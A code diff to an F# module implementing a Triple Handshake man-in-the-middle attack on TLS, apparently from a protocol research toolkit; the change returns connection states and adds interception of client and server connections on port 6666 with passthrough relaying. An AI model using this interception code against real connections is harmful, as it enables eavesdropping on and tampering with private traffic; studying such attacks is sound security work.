@@ -43,13 +43,13 @@ type Attack_TripleHandshake =
 
     static member private logger = LogManager.GetCurrentClassLogger();
 
-    static member runMITM (attacker_server_name:string, attacker_cn:string, attacker_port:int, server_name:string, ?port:int) : unit =
+    static member runMITM (attacker_server_name:string, attacker_cn:string, attacker_port:int, server_name:string, ?port:int) : state * state =
         let port = defaultArg port FlexConstants.defaultTCPPort in
         match Cert.for_signing FlexConstants.sigAlgs_ALL attacker_cn FlexConstants.sigAlgs_RSA with
         | None -> failwith (perror __SOURCE_FILE__ __LINE__ (sprintf "Private key not found for the given CN: %s" attacker_cn))
         | Some(attacker_chain,_,_) -> Attack_TripleHandshake.runMITM(attacker_server_name,attacker_chain,attacker_port,server_name,port)
 
-    static member runMITM (attacker_server_name:string, attacker_chain:Cert.chain, attacker_port:int, server_name:string, ?port:int) : unit =
+    static member runMITM (attacker_server_name:string, attacker_chain:Cert.chain, attacker_port:int, server_name:string, ?port:int) : state * state =
         let port = defaultArg port FlexConstants.defaultTCPPort in
         let attacker_cn =
             match Cert.get_hint attacker_chain with
@@ -123,6 +123,13 @@ type Attack_TripleHandshake =
         Tcp.close sst.ns;
         let cst = FlexAlert.send(cst,TLSError.AD_close_notify) in
         Tcp.close cst.ns;
-        ()
+
+
+        // Create two new Tcp connections as MITM
+        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listener_port=6666,server_cn=server_name,server_port=port) in
+
+        // Enter passthrough mode for the rest of the attack
+        let _ = FlexConnection.passthrough(cst.ns,sst.ns) in
+        sst,cst
 
     end
